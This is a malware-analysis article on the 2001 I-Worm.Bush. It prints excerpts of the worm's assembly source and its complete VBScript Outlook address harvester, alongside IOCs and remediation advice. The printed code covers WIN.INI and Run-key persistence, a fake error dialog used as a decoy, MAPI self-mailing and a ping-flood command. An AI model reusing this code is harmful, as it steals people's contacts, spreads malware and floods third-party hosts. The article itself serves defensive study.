# Dissecting I‑Worm.Bush: WIN.INI Persistence, VBS Address Harvester, and MAPI Mailer 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
I‑Worm.Bush (July 2001) is a 32‑bit Windows worm written in assembly. It installs itself under `%System%\\BIOS.EXE`, sets legacy WIN.INI autorun, drops a VBScript (`Carnet.vbs`) to harvest Outlook addresses into a text file, then scans that file for `mailto:` entries and emails an attached copy via Simple MAPI. On Wednesdays it launches an infinite `ping` against a political website (attempted DoS). The code is minimal and relies on inline strings via macros from `useful.inc`.

No exploits or packing are used; all operations are straight Win32 API and WSH/Outlook automation via VBScript.

## Quick IOCs 🧭
- Files/artifacts
  - `%System%\\BIOS.EXE` (main persistent copy via WIN.INI)
  - `%WinDir%\\Bush.exe` (secondary copy used as attachment)
  - `%WinDir%\\Carnet.vbs` (VBScript address harvester)
  - `%WinDir%\\Carnet.txt` (collected lines like `"mailto:someone@example.com"`)
- Persistence
  - WIN.INI `[windows]` `run = %System%\\BIOS.EXE`
  - HKLM Run (for the harvester): `HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"Carnet d'adresses" = %WinDir%\\Carnet.vbs` (set on first creation)
- Email (MAPI)
  - Subject: `Important and confidential information about...`
  - Body begins: `...the powerfulest man of the world.` and references `www.georgewbush.com`
  - From (string in data): `webmaster@rnc.org`
  - Attachment path: `%WinDir%\\Bush.exe`
- Network/DoS
  - Command launched on Wednesdays: `ping -l 10000 -t www.georgewbush.com`

## Section 2 – Source Code Analysis 🔬
The worm includes `useful.inc` for helper macros such as `@pushsz` (inline strings). Buffers for file paths are short (50 bytes), which can truncate long paths on some systems.

### Installation and WIN.INI autorun
```asm
; Build %System%\BIOS.EXE and %WinDir%\Bush.exe
push 50
push offset szOrig
push eax
callx GetModuleFileNameA

push 50h
push offset szCopie
callx GetSystemDirectoryA
@pushsz "\\BIOS.EXE"
push offset szCopie
callx lstrcat

push 50h
push offset szCopieb
callx GetWindowsDirectoryA
@pushsz "\\Bush.exe"
push offset szCopieb
callx lstrcat

; If not already %System%\BIOS.EXE → copy both and set WIN.INI run
push offset szOrig
push offset szCopie
callx lstrcmp
jz   CAR_A

push 0
push offset szCopie
push offset szOrig
callx CopyFileA
push 0
push offset szCopieb
push offset szOrig
callx CopyFileA

push 50
push offset szWinini
callx GetWindowsDirectoryA
@pushsz "\\WIN.INI"
push offset szWinini
callx lstrcat
push offset szWinini
push offset szCopie
@pushsz "run"
@pushsz "windows"
callx WritePrivateProfileStringA

; Fake error to disguise install
push 30h
@pushsz "Error Load Library"
@pushsz "Cannot run the Dynamic Link Library GWBios.dll"
push 0
callx MessageBoxA
jmp  FIN
```
- Two copies: persisted `%System%\\BIOS.EXE` and a `%WinDir%\\Bush.exe` used later as an email attachment.
- Persistence uses legacy WIN.INI `[windows] run=`.
- Displays a warning‑style MessageBox (0x30) to mask the first‑run exit.

### First‑run payload: drop `Carnet.vbs` and autorun it
```asm
CAR_A:
  push 50
  push offset szCarnet
  callx GetWindowsDirectoryA
  @pushsz "\\Carnet.vbs"
  push offset szCarnet
  callx lstrcat

  ; Create only if absent
  push 0
  push FILE_ATTRIBUTE_NORMAL
  push CREATE_NEW
  push 0
  push FILE_SHARE_READ
  push GENERIC_WRITE
  push offset szCarnet
  callx CreateFileA
  cmp eax,-1
  je  DLL

  mov [FH],eax
  push 0
  push offset octets
  push VBSTAILLE
  push offset vbsd
  push [FH]
  callx WriteFile
  push [FH]
  callx CloseHandle

  ; HKLM Run: "Carnet d'adresses" = %WinDir%\Carnet.vbs (via SHSetValueA)
  @pushsz "SHLWAPI.dll"
  callx LoadLibraryA
  @pushsz "SHSetValueA"
  callx GetProcAddress
  mov [setvalue],eax
  push 08h
  push offset szCarnet
  push 01h
  @pushsz "Carnet d'adresses"
  @pushsz "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  push 80000002h ; HKLM
  call [setvalue]
```
- Creates the harvester only once (`CREATE_NEW`). If the file already exists, the code skips Run‑key setup due to the direct jump, which is a logic quirk.
- Uses `SHSetValueA` resolved dynamically. Note: size/type arguments passed (`08h`, `01h`) don’t match a proper REG_SZ byte count; many SHSetValue implementations still succeed because they ignore `cbData` for strings.

### Connectivity wait and political messages
```asm
DLL:
  @pushsz "WININET.dll"
  callx LoadLibraryA
  @pushsz "InternetGetConnectedState"
  callx GetProcAddress
  mov [netcheck],eax

DODO: push 10000        ; 10s sleep
      callx Sleep
NET:  push 0
      push offset Temp
      call [netcheck]
      dec eax
      jnz DODO

; On connect
push 40h
@pushsz "G.W.Bush"
@pushsz "The man who want to kill poeple and the earth"
push 0
callx MessageBoxA
```
- Polls connectivity every 10 seconds; on success, shows a political message.

### Date‑based triggers: Wednesday DoS and 25th notice
```asm
; Wednesday (wDayOfWeek == 3)
push offset SystemTime
callx GetSystemTime
cmp [SystemTime.wDayOfWeek],03h
jne JOUR2

@pushsz "ping -l 10000 -t www.georgewbush.com"
push 1
callx WinExec

push 40h
@pushsz "Internet"
@pushsz "You can go to the web site : www.georgewbush.com"
push 0
callx MessageBoxA

JOUR2:
  push offset SystemTime
  callx GetSystemTime
  cmp [SystemTime.wDay],25
  jne TXT
  push 40h
  @pushsz "I-Worm.Bush"
  @pushsz "Coded by PetiK (c)2001. To show my anger against this man."
  push 0
  callx MessageBoxA
```
- The Wednesday branch launches an infinite ping flood; effectiveness depends on local ICMP permission and network egress filtering.

### Harvest file scan and Simple MAPI send
```asm
TXT:
  ; Open %WinDir%\Carnet.txt and map it read-only
  @pushsz "\\Carnet.txt"
  ; ... CreateFileA / CreateFileMappingA / MapViewOfFile

  ; Find "mailto:" and extract address until space or quote
  d_scan_mail:
    call @mlt
    db 'mailto:'
  @mlt: pop edi
  scn_mail:
    pushad
    push 7
    pop ecx
    rep cmpsb
    popad
    je  scan_mail
    inc esi
    loop scn_mail

scan_mail:
  xor edx,edx
  add esi,7
  mov edi,offset m_addr
  push edi
p_car:
  lodsb
  cmp al,' '
  je  car_s
  cmp al,'"'
  je  car_f
  cmp al,'@'
  jne not_a
  inc edx
not_a:
  stosb
  jmp p_car
car_s:
  inc esi
  jmp p_car
car_f:
  xor al,al
  stosb
  pop edi
  test edx,edx    ; require at least one '@'
  je   d_scan_mail
  call send       ; MAPISendMail(sMessage)
  jmp  d_scan_mail
```
- The VBScript harvester writes lines like `"mailto:someone@example.com"`; the native code scans for that literal and copies until whitespace or a quote, ensuring an `@` is present.
- Uses Simple MAPI without an explicit `MAPILogon`; relies on a default session if available.

### VBScript harvester payload (embedded)
```vbscript
On Error Resume Next
Set f=CreateObject("Scripting.FileSystemObject")
Set w=CreateObject("WScript.Shell")
If Not f.FileExists(f.GetSpecialFolder(0)&"\Carnet.txt") Then
  Set cr=f.CreateTextFile(f.GetSpecialFolder(0)&"\Carnet.txt")
  cr.Close
End If
Set OA=CreateObject("Outlook.Application")
Set MA=OA.GetNameSpace("MAPI")
For Each A In MA.AddressLists
  If A.AddressEntries.Count <> 0 Then
    For B=1 To A.AddressEntries.Count
      Set C=A.AddressEntries(B)
      If w.RegRead("HKCU\Software\Bush\" & C.Address) <> "OK" Then
        Set car=f.OpenTextFile(f.GetSpecialFolder(0)&"\Carnet.txt", 8, True)
        car.WriteLine """mailto:" & C.Address & """"
        car.Close
        w.RegWrite "HKCU\Software\Bush\" & C.Address, "OK"
      End If
    Next
  End If
Next
```
- Collects Outlook addresses, appends `"mailto:addr"` lines to `%WinDir%\Carnet.txt`, and marks each address in `HKCU\Software\Bush` to avoid duplicates.
- Requires Outlook and permissive OOM; many setups prompt the user.

## Macros from `useful.inc` 🧩
- `@pushsz` for inline strings via call/pop trick (API names, registry keys, literals like `mailto:`).
- The code relies on stdcall‑style pushes followed by `callx` stubs to imported APIs.

## Defense and remediation 🛡️
- Legacy autorun hygiene: Monitor and block writes to WIN.INI `[windows] run=`; search and remove `%System%\\BIOS.EXE` and `%WinDir%\\Bush.exe`.
- Startup harvester: Remove `%WinDir%\\Carnet.vbs` and `%WinDir%\\Carnet.txt`; delete `HKLM\...\Run\"Carnet d'adresses"`.
- Outlook/OOM and MAPI controls: Enforce the Outlook Object Model Guard; block programmatic sends and executable attachments; monitor `MAPISendMail` from non‑mail clients.
- Network: Block outbound ICMP floods; detect non‑browser processes calling `InternetGetConnectedState` on a loop.
- Telemetry: Look for read‑mapping `%WinDir%\\Carnet.txt` followed by email sends; unusual MessageBox strings above can aid hunting.
- Least privilege and allow‑listing: Prevent unknown binaries from writing to Windows/System directories and autorun locations.

## Technical notes (quirks/bugs) 🧪
- Path buffers are only 50 bytes; long paths may truncate.
- The code stores `SHSetValueA` in `setvalue` but must call it via an indirect call (`call [setvalue]`). Some builds of TASM/MASM accept `call setvalue` only if treated as a code label; as data, it should be bracketed.
- `CREATE_NEW` for `Carnet.vbs` means the HKLM Run value is only set on first creation; if the file already exists, the Run entry may never be created.
- Uses Simple MAPI without `MAPILogon`; behavior depends on default session availability.

## Conclusion
I‑Worm.Bush is a compact assembly worm that stitches together legacy autorun (WIN.INI), a VBScript harvester of Outlook addresses, and a Simple MAPI mailer. Its artifacts—`BIOS.EXE`, `Bush.exe`, `Carnet.vbs`/`Carnet.txt`, distinctive messages, and the Wednesday `ping`—are highly deterministic and easy to hunt. Modern controls around script execution, Outlook automation, legacy autoruns, and outbound ICMP make this worm class largely inert in contemporary environments.
